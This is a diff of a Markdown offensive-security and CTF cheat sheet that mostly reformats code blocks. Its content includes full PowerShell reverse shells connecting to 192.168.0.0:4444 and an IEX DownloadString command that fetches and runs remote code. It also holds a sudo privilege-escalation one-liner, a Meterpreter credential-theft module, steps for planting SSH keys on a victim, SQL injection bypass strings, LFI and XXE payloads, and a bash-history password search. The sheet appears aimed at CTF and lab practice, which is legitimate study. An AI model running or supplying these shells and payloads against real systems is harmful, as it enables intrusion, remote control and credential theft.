@@ -622,66 +622,70 @@ Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object
 
 ### PowerShell to retrieve Active Directory objects \(including deleted\)
 
-```text
 ### Decode LDAP Passwords
 https://dotnetfiddle.net/2RDoWz
 
 ### mysql command line alternative
-```
 
+```bash
 mysqldump
+```
 
-```text
 ### TTY Shell that works almost every time on Linux
-```
 
+```bash
 /usr/bin/script -qc /bin/bash /dev/null
-
-```text
-### Kerberos check for valid usernames or bruteforce user/pass with kerbrute
 ```
 
-kerbrute
+### Kerberos check for valid usernames or bruteforce user/pass with kerbrute
 
-```text
+```bash
+kerbrute
+```
+
 https://github.com/TarlogicSecurity/kerbrute
 
 ### Crawls web pages for keywords
-```
 
+```bash
 cewl
+```
 
-```text
 ### TeamViewer Privilege Escalation -> CVE-2019-189888
-```
 
+```
 meterpreter &gt; run post/windows/gather/credentials/teamviewer\_passwords
-
-```text
-### PowerShell Reverse Shell
 ```
 
+### PowerShell Reverse Shell
+
+```PowerShell
 $client = New-Object System.Net.Sockets.TCPClient\('192.168.0.0',4444\);$stream = $client.GetStream\(\);\[byte\[\]\]$bytes = 0..65535\|%{0};while\(\($i = $stream.Read\($bytes, 0, $bytes.Length\)\) -ne 0\){;$data = \(New-Object -TypeName System.Text.ASCIIEncoding\).GetString\($bytes,0, $i\);$sendback = \(iex $data 2&gt;&1 \| Out-String \);$sendback2 = $sendback + 'PS ' + \(pwd\).Path + '&gt; ';$sendbyte = \(\[text.encoding\]::ASCII\).GetBytes\($sendback2\);$stream.Write\($sendbyte,0,$sendbyte.Length\);$stream.Flush\(\)};$client.Close\(\)
 
 $sm=\(New-Object Net.Sockets.TCPClient\('192.168.0.0',4444\)\).GetStream\(\);\[byte\[\]\]$bt=0..65535\|%{0};while\(\($i=$sm.Read\($bt,0,$bt.Length\)\) -ne 0\){;$d=\(New-Object Text.ASCIIEncoding\).GetString\($bt,0,$i\);$st=\(\[text.encoding\]::ASCII\).GetBytes\(\(iex $d 2&gt;&1\)\);$sm.Write\($st,0,$st.Length\)}
+```
 
-```text
 Pull the shell:
-```
 
+```PowerShell
 powershell.exe -c "IEX \(New-Object Net.WebClient\).DownloadString\('SHELL URL'\)"
-
-```text
-### Wget Alternative for Windows in PowerShell
 ```
 
+### Wget Alternative for Windows in PowerShell
+
+```PowerShell
 $client = new-object System.Net.WebClient $client.DownloadFile\("URL","Local Download Path"\)
 
-```text
+```
+
 ### CVE-2019-10-15 Sudo < 1.2.28 Privilege Escalation
-``sudo -u#-1 /bin/bash``
+
+```
+sudo -u#-1 /bin/bash
+```
 
 ### Adminer Database Management Tool Exploit Bypass Login
+
 https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool
 
 ### Alternate data streams of empty or incomplete file on SMB
@@ -693,21 +697,26 @@ https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool
 ``ls``
 
 ### Telnet > Netcat
+
 When connecting to a service, where possible, choose TELNET over Netcat 
 
 ### /etc/update-motd.d Privilege Escalation
+
 https://blog.haao.sh/writeups/fowsniff-writeup/
 
 ### SSH into Victim without password
+
 1. From the attacker machine generate RSA keypair: ``ssh-keygen -t rsa``
 2. Copy the public key (id_rsa.pub) into the ``.ssh/authorized_keys`` file of the victim
 3. SSH with the -i argument (id_rsa)
 
 ### Really Good Privilege Escalation Scripts
+
 https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
 
 
 ### XMPP Authentication Crack
+
 ```python
 import base64
 import hashlib
@@ -745,72 +754,53 @@ for passlen in range(1,3):
 
 ### CTF Docs
 
-```text
 https://github.com/welchbj/ctf/tree/master/docs
-```
 
 ### Test for LDAP NULL BIND
 
-```text
+```bash
 ldapsearch -H ldap://host:port -x -s base '' "(objectClass=*)" "*" +
 ```
 
 ### Extract VBA Script from document
 
-```text
 https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php
-```
 
 ### Decode Rubber Ducky USB .bin payloads
 
-```text
 https://ducktoolkit.com/decode#
-```
 
 ### Crack Android lockscreen from system files \(gesture.key\)
 
-```text
 https://github.com/KieronCraggs/GestureCrack
-```
 
 ### XOR Analysis
 
-```text
 https://github.com/hellman/xortool
-```
 
 ### Cryptanalysis
 
-```text
 https://github.com/nccgroup/featherduster
-```
 
 ### RSA Cracking Tools
 
-```text
-https://github.com/Ganapati/RsaCtfTool
-https://github.com/ius/rsatool
-```
+* https://github.com/Ganapati/RsaCtfTool
+* https://github.com/ius/rsatool
+
 
 ### Morse Code Audio Decode
 
-```text
 https://morsecode.world/international/decoder/audio-decoder-adaptive.html
-```
 
 ### Text to 21 Common Ciphers
 
-```text
 https://v2.cryptii.com/text/select
-```
 
-### Crypto Example Challs
+### Crypto Example Challenges
 
-```text
 https://asecuritysite.com/encryption/ctf?mybutton=
-```
 
-### Shift in Python
+### Shift in Python (crypto)
 
 ```python
 with open('FILENAME') as f:
@@ -819,18 +809,15 @@ with open('FILENAME') as f:
         print ''.join([chr((ord(y) + x) % 256) for y in msg])
 ```
 
-### Predict encoding type
+### Predict encoding/crypto type
 
-```text
 https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')
-```
 
 ### Get data, process and respond over a socket
 
 ```python
 import socket
 import re
-
 
 clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 clientsocket.connect(('IP', PORT))
@@ -847,13 +834,13 @@ print data
 
 _Domain Names_
 
-```text
+```bash
 tshark -r *PCAP* -Y 'dns' -T fields -e dns.qry.name | sort -u > dns.txt
 ```
 
 _Hosts_
 
-```text
+```bash
 tshark -r *PCAP* -Y 'tls.handshake.extensions_server_name' -T fields -e tls.handshake.extensions_server_name | sort -u > hosts.txt
 ```
 
@@ -924,33 +911,31 @@ UNunionION SEselectLECT 1,2,3%23
 
 _Download pkcrack_
 
-```text
 https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/download1.html
 
 ! Before using, it must be built from source
-```
 
 _Syntax_
 
-```text
+```bash
 ./pkcrack -C encrypted.zip -c file -P plaintext.zip -p file
 ```
 
 ### Python Functions
 
-Files: [https://www.w3schools.com/python/python\_ref\_file.asp](https://www.w3schools.com/python/python_ref_file.asp)   
- Strings: [https://www.w3schools.com/python/python\_ref\_string.asp](https://www.w3schools.com/python/python_ref_string.asp)   
- Keyworks: [https://www.w3schools.com/python/python\_ref\_keywords.asp](https://www.w3schools.com/python/python_ref_keywords.asp)   
- Random: [https://www.w3schools.com/python/module\_random.asp](https://www.w3schools.com/python/module_random.asp)   
+* Files: [https://www.w3schools.com/python/python\_ref\_file.asp](https://www.w3schools.com/python/python_ref_file.asp)   
+* Strings: [https://www.w3schools.com/python/python\_ref\_string.asp](https://www.w3schools.com/python/python_ref_string.asp)   
+* Keyworks: [https://www.w3schools.com/python/python\_ref\_keywords.asp](https://www.w3schools.com/python/python_ref_keywords.asp)   
+* Random: [https://www.w3schools.com/python/module\_random.asp](https://www.w3schools.com/python/module_random.asp)   
 
 
 ### PHP Functions
 
-Files: [https://www.w3schools.com/php/php\_ref\_filesystem.asp](https://www.w3schools.com/php/php_ref_filesystem.asp)   
- Directories: [https://www.w3schools.com/php/php\_ref\_directory.asp](https://www.w3schools.com/php/php_ref_directory.asp)   
- Errors: [https://www.w3schools.com/php/php\_ref\_error.asp](https://www.w3schools.com/php/php_ref_error.asp)   
- Network: [https://www.w3schools.com/php/php\_ref\_network.asp](https://www.w3schools.com/php/php_ref_network.asp)   
- Misc: [https://www.w3schools.com/php/php\_ref\_misc.asp](https://www.w3schools.com/php/php_ref_misc.asp)
+* Files: [https://www.w3schools.com/php/php\_ref\_filesystem.asp](https://www.w3schools.com/php/php_ref_filesystem.asp)   
+* Directories: [https://www.w3schools.com/php/php\_ref\_directory.asp](https://www.w3schools.com/php/php_ref_directory.asp)   
+* Errors: [https://www.w3schools.com/php/php\_ref\_error.asp](https://www.w3schools.com/php/php_ref_error.asp)   
+* Network: [https://www.w3schools.com/php/php\_ref\_network.asp](https://www.w3schools.com/php/php_ref_network.asp)   
+* Misc: [https://www.w3schools.com/php/php\_ref\_misc.asp](https://www.w3schools.com/php/php_ref_misc.asp)
 
 ### PHP Jail Escape
 
@@ -1012,11 +997,11 @@ https://example.com/index.php?page=php://filter/convert.base64-encode/resource=i
 
 ### Useful PCAP Reader
 
-```text
+```bash
 chaosreader
 ```
 
-### ZIP Format Signatures
+### ZIP Format File Signatures
 
 _HEADER_
 
@@ -1069,7 +1054,7 @@ _INSIDE DTD FILE_
 %p2;
 ```
 
-### Hidden terminal input history
+### Search bash history for passwords
 
 ```bash
 find . -name .bash_history -exec grep -A 1 '^passwd' {} \;
